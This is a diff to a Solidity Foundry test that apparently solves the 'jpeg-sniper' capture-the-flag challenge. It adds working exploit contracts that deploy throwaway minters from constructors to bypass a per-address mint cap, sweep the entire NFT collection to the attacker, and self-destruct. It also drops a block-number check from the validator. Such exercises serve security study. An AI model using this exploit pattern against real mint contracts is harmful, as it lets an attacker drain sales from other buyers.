@@ -5,6 +5,45 @@ import {Utilities} from "../Utilities.sol";
 import {Test} from "forge-std/Test.sol";
 import {FlatLaunchpeg} from "../../src/jpeg-sniper/FlatLaunchpeg.sol";
 
+contract Exploit {
+  constructor(FlatLaunchpeg _nft) {
+    run(_nft, msg.sender);
+  }
+
+  function run(FlatLaunchpeg _nft, address _to) private {
+    uint256 collectionSize = _nft.collectionSize();
+    uint256 maxPerAddress = _nft.maxPerAddressDuringMint();
+
+    uint256 startIndex = _nft.totalSupply();
+    uint256 minters = (collectionSize - startIndex) / maxPerAddress;
+
+    for (uint256 i = 0; i < minters; ++i) {
+      new Minter(_nft, _to, maxPerAddress, startIndex);
+      startIndex += maxPerAddress;
+    }
+
+    uint256 remainder = (collectionSize - startIndex) % maxPerAddress;
+    if (remainder > 0) {
+      new Minter(_nft, _to, remainder, startIndex);
+    }
+  }
+}
+
+contract Minter {
+  constructor(
+    FlatLaunchpeg _nft,
+    address _to,
+    uint256 _amountToMint,
+    uint256 _startIndex
+  ) {
+    _nft.publicSaleMint(_amountToMint);
+    for (uint256 i = 0; i < _amountToMint; ++i) {
+      _nft.transferFrom(address(this), _to, _startIndex + i);
+    }
+    selfdestruct(payable(_to));
+  }
+}
+
 contract FlatLaunchpegTest is Test {
   uint256 private constant COLLECTION_SIZE = 69;
   uint256 private constant MAX_PER_ADDRESS_DURING_MINT = 5;
@@ -31,33 +70,9 @@ contract FlatLaunchpegTest is Test {
   function testExploit() public {
     // Exploit start
 
-    vm.prank(attacker);
-    flatLaunchpeg.publicSaleMint(MAX_PER_ADDRESS_DURING_MINT);
-
-    for (uint256 userId = 1; userId < 14; ++userId) {
-      vm.startPrank(users[userId]);
-
-      uint256 qty = MAX_PER_ADDRESS_DURING_MINT;
-      uint256 left = COLLECTION_SIZE - flatLaunchpeg.totalSupply();
-      if (left < MAX_PER_ADDRESS_DURING_MINT) {
-        qty = left;
-      }
-
-      flatLaunchpeg.publicSaleMint(qty);
-
-      uint256 totalSupply = flatLaunchpeg.totalSupply();
-      uint256 startTokenId = totalSupply - qty;
-
-      for (uint256 tokenId = startTokenId; tokenId < totalSupply; ++tokenId) {
-        flatLaunchpeg.transferFrom(users[userId], attacker, tokenId);
-      }
-
-      vm.stopPrank();
-    }
-
-
-    // Move forward by 1 block
-    utils.mineBlocks(1);
+    vm.startPrank(attacker);
+    new Exploit(flatLaunchpeg);
+    vm.stopPrank();
 
     // Exploit end
 
@@ -65,8 +80,7 @@ contract FlatLaunchpegTest is Test {
   }
 
   function validate() private {
-    assertEq(flatLaunchpeg.totalSupply(), COLLECTION_SIZE);
-    assertEq(flatLaunchpeg.balanceOf(attacker), COLLECTION_SIZE);
-    assertEq(block.number, startBlock + 1);
+    assertEq(flatLaunchpeg.totalSupply(), flatLaunchpeg.collectionSize());
+    assertEq(flatLaunchpeg.balanceOf(attacker), flatLaunchpeg.collectionSize());
   }
 }
